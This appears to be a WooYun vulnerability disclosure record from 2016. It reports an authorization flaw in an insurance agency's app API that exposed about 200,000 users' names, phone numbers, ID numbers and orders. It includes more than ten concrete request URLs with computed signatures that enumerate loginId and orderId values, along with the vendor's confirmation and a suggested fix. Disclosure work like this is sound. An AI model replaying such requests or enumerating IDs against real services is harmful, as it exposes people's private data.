{"id": 74306, "wybug_id": "wooyun-2016-0169407", "wybug_title": "新一站某处越权获取用户信息（20w用户姓名/证件号/手机号/无数订单详情)", "wybug_corp": "新一站保险代理有限公司", "wybug_author": "路人甲", "wybug_date": "2016-01-12 18:22", "wybug_open_date": "2016-02-22 16:48", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-22：\t细节向公众公开  简要描述： RT  详细说明：  官网下APP，APP未混淆，可反编译，存在越权漏洞，所以。结合以上，遍历获取用户信息。sig算法\n\n菜逼写个脚本算sig\n\n之后用burpsuite跑起来用户资料，用过修改loginid\n\nloginid已达20w，涉及用户姓名，手机号，身份证号，邮箱等\n\n订单列表，20w用户的订单，不计其数\n\n\n\n订单详情，通过orderid越权\n\n\n\n联系人列表，涉及身份证/护照等证件号，手机号，姓名等\n\n\n\n提供几条信息，方便验证\n联系人列表www.xyz.cn/api/user/favorite/insureds/get?pageNo=1&loginId=200089&sid=API_APP_AND&uid=14749&v=1.0.1&ts=2016-01-11+17%3A30%3A16&pageSize=500&sig=F584F8DEE3492219E71DBE4939C12F9www.xyz.cn/api/user/favorite/insureds/get?pageNo=1&loginId=200098&sid=API_APP_AND&uid=14749&v=1.0.1&ts=2016-01-11+17%3A30%3A16&pageSize=500&sig=8E1EBB71226D0322AB7E1ACD2DB7FAAAwww.xyz.cn/api/user/favorite/insureds/get?pageNo=1&loginId=200140&sid=API_APP_AND&uid=14749&v=1.0.1&ts=2016-01-11+17%3A30%3A16&pageSize=500&sig=AD00126B33B3A61570A14251BBD8B137www.xyz.cn/api/user/favorite/insureds/get?pageNo=1&loginId=200113&sid=API_APP_AND&uid=14749&v=1.0.1&ts=2016-01-11+17%3A30%3A16&pageSize=500&sig=A5B30D4D28406ECDC568DE9C364EB65E订单详情www.xyz.cn/api/order/get?sid=API_APP_AND&orderId=160107098051&uid=14749&v=1.0.1&ts=2016-01-12+12%3A30%3A16&sig=7B7182B2D3D5FC0D44B7777C9A162A8Fwww.xyz.cn/api/order/get?sid=API_APP_AND&orderId=160107098134&uid=14749&v=1.0.1&ts=2016-01-12+12%3A30%3A16&sig=45FC12B7B62FA7CAB0E8530C08DC941Awww.xyz.cn/api/order/get?sid=API_APP_AND&orderId=160107098008&uid=14749&v=1.0.1&ts=2016-01-12+12%3A30%3A16&sig=3C52B16E7F1D4C2274AC6A7DB0CDC56B查询用户信息www.xyz.cn/api/user/get?loginId=200101&sid=API_APP_AND&uid=14749&v=1.0.1&ts=2016-01-11+17%3A30%3A16&sig=2D23DC841F2F5616867024FDF185703Ewww.xyz.cn/api/user/get?loginId=200091&sid=API_APP_AND&uid=14749&v=1.0.1&ts=2016-01-11+17%3A30%3A16&sig=E9C0909F22CBC5E6190A52F91B5DCF1Cwww.xyz.cn/api/user/get?loginId=200092&sid=API_APP_AND&uid=14749&v=1.0.1&ts=2016-01-11+17%3A30%3A16&sig=02043C74D504604CB64FAE5DDE5D7BC2\n   漏洞证明：     修复方案：  代码混淆，修复越权 加密串修改测试获得的数据已删除，无备份   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-01-13 09:32 厂商回复： 非常感谢！我们会在今天修复。Rank20已经不足以表达我们的谢意！洞主记得看私信。 最新状态： 2016-01-13：洞主记得认领并私信我们。谢谢！  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}